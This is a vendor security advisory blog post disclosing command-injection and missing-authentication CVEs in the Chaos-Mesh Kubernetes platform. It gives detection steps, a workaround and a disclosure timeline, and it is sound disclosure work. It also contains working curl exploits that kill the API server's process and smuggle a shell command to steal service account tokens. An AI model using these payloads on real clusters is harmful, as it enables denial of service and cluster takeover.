@@ -1,0 +1,165 @@
+JFrog Security Research recently discovered and disclosed multiple CVEs in the highly popular Chaos engineering platform – Chaos-Mesh. The discovered CVEs, which we’ve named Chaotic Deputy are CVE-2025-59358, CVE-2025-59360, CVE-2025-59361 and CVE-2025-59359. The last three Chaotic Deputy CVEs are critical severity (CVSS 9.8) vulnerabilities which can be easily exploited by in-cluster attackers to run arbitrary code on any pod in the cluster, even in the default configuration of Chaos-Mesh.
+Users of Chaos-Mesh are recommended to upgrade Chaos-Mesh to the fixed version – 2.7.3, as soon as possible. If you are unable to upgrade your Chaos-Mesh version, see our “Workarounds” section below.
+Some infrastructures that use Chaos-Mesh are also affected by these vulnerabilities, for example Azure Chaos Studio.
+In this technical blogpost, we will delve deeper into the inner workings of the Chaos-Mesh platform and explain the issues that led to these vulnerabilities.
+We would like to thank the Chaos-Mesh maintainers for working with us to quickly fix these issues and keep users of Chaos-Mesh safe.
+Who is affected by Chaotic Deputy?
+Attack prerequisites
+In order to exploit “Chaotic Deputy” an attacker will need initial access to the Cluster’s network. While this requirement narrows down the chance of external exploits, unfortunately cases where attackers have in-cluster access are quite common.
+Attackers that have in-cluster access, even those running within an unprivileged pod, can exploit the vulnerabilities in the default configuration and access the Chaos Controller Manager GraphQL server, which will allow them to execute the chaos platform’s native Fault Injections (Shut down pods, interrupt network, etc) and inject OS command in order to perform actions on other pods – such as stealing privileged service account tokens.
+Detection
+In order to detect if you are vulnerable to Chaotic Deputy vulnerability, run these two shell commands:
+kubectl get pods -A --selector app.kubernetes.io/name=chaos-mesh -o=jsonpath="{range .items[*]}{.metadata.name}{': '}{range .spec.containers[*]}{.image}{', '}{end}{'\n'}{end}"
+
+kubectl describe pod chaos-controller-manager -n chaos-mesh | grep "CTRL_ADDR:"
+It should print out the chaos-mesh pod names along with their respective image, if the “chaos-mesh” image version is earlier than 2.7.3, and the port number “10082” returned from the pod’s description, you are vulnerable.
+Note that for each cluster the namespace can be configured differently, and not specifically “chaos-mesh”, please change “chaos-mesh” to the namespace in which you have deployed Chaos Mesh.
+Terminal output shows the current deployed chaos-mesh images versions
+Terminal output shows that the current chaos controller manager has port 10082 open
+Workarounds
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the chaosctl tool and port:
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+Diving into the Chaotic Deputy vulnerabilities
+Bugs in Production? Meet Chaos Engineering
+Bugs, especially in production can terrify even the most composed developers around, but apparently some prefer to invite them intentionally to their environment.
+Chaos Engineering is the discipline of causing intentional faults on a system in order to improve resiliency, under the assumption that bugs are unavoidable so it is better to learn to deal with them rather than consume resources while trying to avoid them.
+While the concept is rather old, the Chaos Engineering concept underwent some transformations from scheduled scripts on a monolith system to cloud native platforms implemented on Kubernetes or offered by cloud providers as a service.
+The Chaos-Mesh Platform
+Chaos-Mesh is a Cloud Native Computing Foundation incubating project that brings various types of fault simulation to Kubernetes and has an enormous capability to orchestrate fault scenarios. Some managed Kubernetes service platforms support Chaos-Mesh and integrate it as part of their fault injection services, such as Azure’s Chaos Studio for AKS.
+The ability to cause faults across the entire Kubernetes cluster makes the Chaos-Mesh platform a highly appealing research target.
+Reading the platform’s architecture and documentation we’ve learned that the platform consists of three major components:
+
+Chaos Dashboard: The visualization component of Chaos-Mesh. Chaos Dashboard offers a web interface through which users can manipulate and observe Chaos experiments. At the same time, Chaos Dashboard also provides an RBAC permission management mechanism.
+Chaos Controller Manager: The core logical component of Chaos-Mesh. Chaos Controller Manager is primarily responsible for the scheduling and management of Chaos experiments. This component contains several CRD Controllers, such as Workflow Controller, Scheduler Controller, and Controllers of various fault types.
+Chaos Daemon: The main executive component. Chaos Daemon runs in the DaemonSet mode and has the Privileged permission by default. This component mainly interferes with specific network devices, file systems, and kernels.
+Looking at the diagram, we saw that the “Chaos Controller Manager” has a complex variety of components to talk to. This fact and the lack of official documentation on its internal operation intrigued us as a research target, which led us to discover the Chaotic Deputy vulnerabilities.
+CVE-2025-59358 – Missing authentication – leading to inherent DoS
+Analyzing the “Chaos Controller Manager” service account showed that it is of ClusterIP type (Which make the exposed ports available across the cluster):
+We discovered that a debugging tool, activated by default on the Controller, is an exposed GraphQL server. To our surprise this server was not enforcing authentication for the “/query” endpoint!
+....
+
+if ccfg.ControllerCfg.CtrlAddr != "" {
+		go func() {
+			mutex := http.NewServeMux()
+			mutex.Handle("/", playground.Handler("GraphQL playground", "/query"))
+			mutex.Handle("/query", params.CtrlServer)
+			setupLog.Info("setup ctrlserver", "addr", ccfg.ControllerCfg.CtrlAddr)
+			setupLog.Error(http.ListenAndServe(ccfg.ControllerCfg.CtrlAddr, mutex), "unable to start ctrlserver")
+		}()
+	}
+
+	hookServer.Register("/validate-auth", &webhook.Admission{
+		Handler: apiWebhook.NewAuthValidator(ccfg.ControllerCfg.SecurityMode, authCli, mgr.GetScheme(),
+			ccfg.ControllerCfg.ClusterScoped, ccfg.ControllerCfg.TargetNamespace, ccfg.ControllerCfg.EnableFilterNamespace,
+			params.Logger.WithName("validate-auth"),
+		),
+	},
+	)
+....
+We deployed a pod in a different namespace and attempted to communicate with the GraphQL server and it worked as expected:
+As it appears, we had indirect control on the Chaos Daemon through the Chaos Controller tool; we could instruct it to initiate fault injections across the Kubernetes cluster at will.
+We instructed it to initiate the “killProcesses” mutation on the Kubernetes storage provisioner pod to cause a service disruption. This operation can be applied to any pod on the cluster – including the API server pod, causing a cluster-wide DoS attack:
+# mutation KillProcessesInPod {
+#  pod(ns: "", name: "") {
+#    killProcesses(pids: ["", ""]) {
+#      pid
+#      command
+#    }
+#  }
+
+curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' "http://chaos-mesh-controller-manager.chaos-mesh.svc.cluster.local:10082/query"
+This screencast shows the initiating of a remote pod fault injection which shuts down the pod’s process
+CVE-2025-59359, CVE-2025-59360 and CVE-2025-59361 – OS Command Injection
+We took a peek at how the Fault Injection experiments were being executed, and we discovered three mutations in which we could cause OS command injection with minimal effort:
+1. The cleanTcs mutation
+mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) {
+pod(ns: $namespace, name: $podName) {
+  pod { 
+    name
+    namespace
+  }
+  cleanTcs(devices: $devices)
+  }
+}
+The resolver of this mutation is:
+// cleanTcs returns actually cleaned devices
+func (r *Resolver) cleanTcs(ctx context.Context, obj *v1.Pod, devices []string) ([]string, error) {
+	var cleaned []string
+	for _, device := range devices {
+		cmd := "tc qdisc del dev " + device + " root"
+		_, err := r.ExecBypass(ctx, obj, cmd, bpm.PidNS, bpm.NetNS)
+		if err != nil {
+			return cleaned, errors.Wrapf(err, "exec `%s`", cmd)
+		}
+		cleaned = append(cleaned, device)
+	}
+	return cleaned, nil
+}
+2. The killProcesses mutation
+mutation MutatePod($namespace: String! = \"default\", $podName: String!, $pids: [String!]!) {
+pod(ns: $namespace, name: $podName) {
+  pod { 
+    name
+    namespace
+  }
+  killProcesses(pids: $pids) {
+    pid
+    command
+    }
+  }
+}
+// killProcess kill all alive processes in pids
+func (r *Resolver) killProcess(ctx context.Context, pod *v1.Pod, pids []string) ([]*model.KillProcessResult, error) {
+	...
+	cmd := fmt.Sprintf("kill %s", strings.Join(pids, " "))
+	if _, err = r.ExecBypass(ctx, pod, cmd, bpm.PidNS, bpm.MountNS); err != nil {
+		return nil, errors.Wrapf(err, "run command %s", cmd)
+	}
+	return killResults, nil
+}
+3. The cleanIptables mutation
+mutation CleanIptables($namespace: String!, $podName: String!, $chains: [String!]!) {
+  pod(ns: $namespace, name: $podName) {
+    cleanIptables(chains: $chains)
+  }
+}
+// cleanIptables returns actually cleaned chains
+func (r *Resolver) cleanIptables(ctx context.Context, obj *v1.Pod, chains []string) ([]string, error) {
+	var cleaned []string
+	for _, chain := range chains {
+		cmd := "iptables -F " + chain
+		_, err := r.ExecBypass(ctx, obj, cmd, bpm.PidNS, bpm.NetNS)
+		if err != nil {
+			return cleaned, errors.Wrapf(err, "exec `%s`", cmd)
+		}
+		cleaned = append(cleaned, chain)
+	}
+	return cleaned, nil
+}
+In all mutations we can clearly see that user input is concatenated directly into the “cmd” parameter which in turn sinks directly into the “ExecBypass” method that is responsible for executing the command on the desired pod, allowing attackers to add arbitrary shell commands to execute.
+Lateral movement to achieve total cluster takeover
+Now that we can run arbitrary OS commands on the Chaos Daemon, we would like to extend our foothold and control the entire cluster, by running arbitrary OS commands on arbitrary pods.
+Luckily for us – by design, the Chaos Daemon is able to execute arbitrary commands on any other pod in the cluster. Each pod’s filesystem is mounted under a “/proc/<PID>/root” path in the daemon. The daemon uses the “nsexec” binary to perform command execution in any pod in the cluster.  This is achieved by communicating with exposed namespaces in the “proc” filesystem of the pod.
+In order to map which pod name corresponds to which PID, we can use other API calls found on the Chaos Controller Manager in order to view all pod names and their corresponding PID.
+
+That way we can locate our own PID and target another pod’s PID and concatenate it into the service account token path  (“/proc/<PID>/root/var/run/secrets/kubernetes.io/serviceaccount/token”), and copy the token into our own pod /tmp folder, that way we can obtain the privileges of each service account present on the current cluster.
+Here, for example, we can view a cURL command that takes the service account token from the pod residing at PID “3182” and copying it into our own pod’s (PID 187600) “/tmp” folder:
+curl -X POST http://chaos-mesh-controller-manager.chaos-mesh.svc.cluster.local:10082/query -H 'Content-Type: application/json' -d '{
+    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
+    "variables": {
+      "namespace": "kube-system",
+      "podName": "coredns-5dd5756b68-779rm",
+      "devices": ["eth0 root; cp /proc/3182/root/var/run/secrets/kubernetes.io/serviceaccount/token /proc/187600/root/tmp/stolen_token; "]
+    }
+  }'
+This screencast shows how to steal all available Service Account tokens by exploiting the command injection vulnerability
+After we’ve obtained a Service Account Token, we can simply use “kubectl” to run arbitrary commands on the pods governed by that service account.
+Platforms such as Chaos-Mesh give, by design, dangerous API privileges to certain pods that in cases of abuse can gain complete control of the Kubernetes cluster. This potential abuse can become a critical risk when vulnerabilities such as Chaotic Deputy are discovered. We recommend Chaos-Mesh users to upgrade swiftly since these vulnerabilities are extremely easy to exploit and lead to total cluster takeover while having only cluster network access.
+Disclosure Timeline
+
+May 6, 2025  – JFrog Security research reported the vulnerabilities to the Chaos-Mesh development team.
+Aug 21, 2025 –  The Chaos-Mesh development team released a new version containing a short term fix (CtrlServer is not active by default).
+Sep 15, 2025 – CVEs published.
+Sep 16, 2025 – JFrog Security research publishes this article.
+Staying Safe
+With an expanding attack surface and new threats being discovered every day, it pays to stay on top of the latest vulnerabilities by bookmarking the JFrog Security Research Center and checking out our latest discoveries.
